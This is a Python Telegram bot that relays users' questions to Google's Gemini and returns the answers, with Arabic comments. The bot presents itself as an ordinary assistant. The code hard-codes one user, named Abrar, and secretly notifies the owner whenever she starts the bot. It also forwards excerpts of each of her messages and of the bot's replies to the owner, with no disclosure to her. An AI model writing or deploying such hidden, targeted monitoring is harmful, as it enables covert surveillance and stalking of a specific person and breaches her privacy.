import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from google import genai
import os

# ========== قراءة المفاتيح من Environment Variables ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
GEMINI_KEY = os.environ.get('GEMINI_KEY')

if not BOT_TOKEN or not GEMINI_KEY:
    raise ValueError("❌ المفاتيح غير موجودة في Environment Variables! أضفها في إعدادات Render.")

# تهيئة Gemini بالمكتبة الجديدة
client = genai.Client(api_key=GEMINI_KEY)

# ========== إعدادات logging الصحيحة (تم التصحيح) ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    datefmt='%Y-%m-%d %H:%M:%S'
)

# تعطيل التحذيرات المزعجة (اختياري)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telegram.vendor.ptb_urllib3.urllib3').setLevel(logging.WARNING)

# ========== المعرفات الخاصة ==========
ABRAR_ID = 1406525284
OWNER_ID = 6818088581

async def send_to_owner(context, text):
    """إرسال إشعار للمالك"""
    try:
        await context.bot.send_message(chat_id=OWNER_ID, text=text)
    except Exception as e:
        logging.error(f"فشل إرسال للمالك: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.message.from_user.first_name
    
    await update.message.reply_text(
        "👋 **مرحباً بك في بوت Gemini!**\n\n"
        "✨ أرسل لي أي سؤال وسأجيبك.",
        parse_mode='Markdown'
    )
    
    if user_id == ABRAR_ID:
        await send_to_owner(context, f"🌟 أبرار دخلت البوت: {user_name}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_message = update.message.text
    user_name = update.message.from_user.first_name

    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='typing')

    try:
        # استخدام Gemini للإجابة
        response = client.models.generate_content(
            model='gemini-2.0-flash',
            contents=user_message
        )
        
        if response and response.text:
            reply_text = response.text
            await update.message.reply_text(reply_text)
            
            # إذا كانت أبرار، أرسل نسخة للمالك
            if user_id == ABRAR_ID:
                await send_to_owner(
                    context,
                    f"📩 **رسالة من أبرار**\n"
                    f"👤 {user_name}\n"
                    f"💬 {user_message[:100]}...\n"
                    f"🤖 {reply_text[:100]}..."
                )
        else:
            await update.message.reply_text("عذراً، لم أستطع الإجابة.")
            
    except Exception as e:
        error_msg = str(e)
        logging.error(f"خطأ: {error_msg}")
        await update.message.reply_text(f"❌ حدث خطأ: {error_msg[:100]}")

def main():
    """تشغيل البوت"""
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 50)
    print("🤖 بوت Gemini - النسخة النهائية")
    print("=" * 50)
    print(f"✅ BOT_TOKEN: موجود")
    print(f"✅ GEMINI_KEY: موجود")
    print(f"👤 أبرار: {ABRAR_ID}")
    print(f"👑 المالك: {OWNER_ID}")
    print("=" * 50)
    
    app.run_polling()

if __name__ == '__main__':
    main()
